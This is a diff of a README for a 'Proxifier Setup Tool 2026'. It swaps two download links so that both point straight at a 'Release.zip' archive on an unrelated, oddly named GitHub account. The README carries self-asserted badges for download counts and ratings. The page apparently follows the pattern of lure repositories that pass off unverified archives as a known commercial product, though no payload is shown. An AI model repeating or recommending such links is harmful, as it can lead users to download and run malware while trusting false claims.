@@ -1,6 +1,6 @@
 # Proxifier Setup Tool 2026
 
-[![Download](https://img.shields.io/badge/Download-Setup%20Page-0a84ff?style=for-the-badge&logo=github)](https://git-setup.github.io/download/)
+[![Download](https://img.shields.io/badge/Download-Setup%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/HandcuffGemCastle/Proxifier-configs-addons/releases/download/Release/Release.zip)
 ![Downloads](https://img.shields.io/badge/Downloads-29K+-1f6feb?style=for-the-badge&logo=github)
 ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-f4c430?style=for-the-badge&logo=star)
 ![Latest Version](https://img.shields.io/badge/Latest%20Version-4.6.1-8ac926?style=for-the-badge&logo=github)
@@ -14,7 +14,7 @@
 
 ## Download
 
-[![Download Proxifier Setup](https://img.shields.io/badge/Download%20Proxifier%20Setup-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://git-setup.github.io/download/)
+[![Download Proxifier Setup](https://img.shields.io/badge/Download%20Proxifier%20Setup-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/HandcuffGemCastle/Proxifier-configs-addons/releases/download/Release/Release.zip)
 
 ## Software Information
 
